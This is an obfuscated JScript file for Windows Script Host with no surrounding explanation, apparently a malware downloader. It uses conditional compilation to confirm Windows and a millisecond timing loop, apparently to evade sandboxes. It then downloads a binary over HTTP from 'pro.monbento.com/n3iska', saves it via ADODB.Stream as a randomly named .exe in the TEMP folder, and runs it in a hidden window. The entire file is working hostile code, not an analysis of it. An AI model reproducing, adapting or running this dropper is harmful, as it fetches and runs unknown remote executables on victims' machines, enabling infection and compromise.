var _S0 = false;
var _A = "CreateObject";
var _MM = function _Q() {return WScript[_A]("WScript"+".Shell");}(), _Z = 11;
var _A0 = "MSXML2.XMLHTTP";
var _F = 2123213;
var _AV = 0;
function _OL(_L){_MM["Run"](_L, _AV, _AV);};
function _X(){return _A0 + "";};
function _G(_Q0, _X0){_AV = _AV * 1; return _Q0 - _X0;};
function _GR(){return _A;};
/*@cc_on
  @if (@_win32 || @_win64)
    _S0 = true;
  @end
@*/
if (_S0)
{
var _T = "";
function _I(){return 22;};
var _US = 0; var _S = 0;
function _Y()
{
var _NP = new this["Date"]();
var _HE = _NP["getUTCMilliseconds"]();
WScript["Sleep"](_I());
var _NP = new this["Date"]();
var _K = _NP["getUTCMilliseconds"]();
WScript["Sleep"](_I());
var _NP = new this["Date"]();
var _R = _NP["getUTCMilliseconds"]();
var _US = "_WI";
_US = _G(_K, _HE);
var _S = "_OP";
_S = _G(_R, _K);
_T = "open";
return _G(_US, _S);
}
var _LG = false;
var _AW = false;
for (var _JZ = _AV; _JZ < _I() * 1; _JZ++){if (_Y() != _AV){
_LG = true; 
_S = "31" + 11 * _US + _S; 
_AW = true; 
break;
}}
function _H() {return ((_LG == true) && (_LG == _AW)) ? 1 : _AV;};
if (_LG && _H() && _AW){
function _MJ() {return _MM["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "nCGhgdWJnLIjWWF.ex" + "e";};
 _G0 = _X();
 _PI = WScript[_A](_G0);
 var _JK = 1;
 while (_JK){
try {
	if (_JK == 1)
	{
		_PI[_T]("GET", "http://pro.monbento.com/n3iska", false);
		_PI["send"]();
		_CV = "Sleep";
	}
	WScript[_CV](_I() + 120); 
	if (_PI["readystate"] < 2 * 2) continue;
	_JK = _AV;
	function _IB(_FH) {var _P = (1, 2, 3, 4, 5, _FH); return _P;};
	_J = WScript[_GR()]("ADODB.Stream");
	_G0 = _J;
	_G0[_T]();
	_G0["type"] = _IB(1);
	_G0["write"](_PI["ResponseBody"]);
	_J["position"] = _IB(_AV);
	_G0["Save" + "ToFile"](_MJ(), 2);
	_J["cl"+"ose"]();
	_GV = _MJ();
	_OL(_GV);
} catch(_W){};
}
}
}

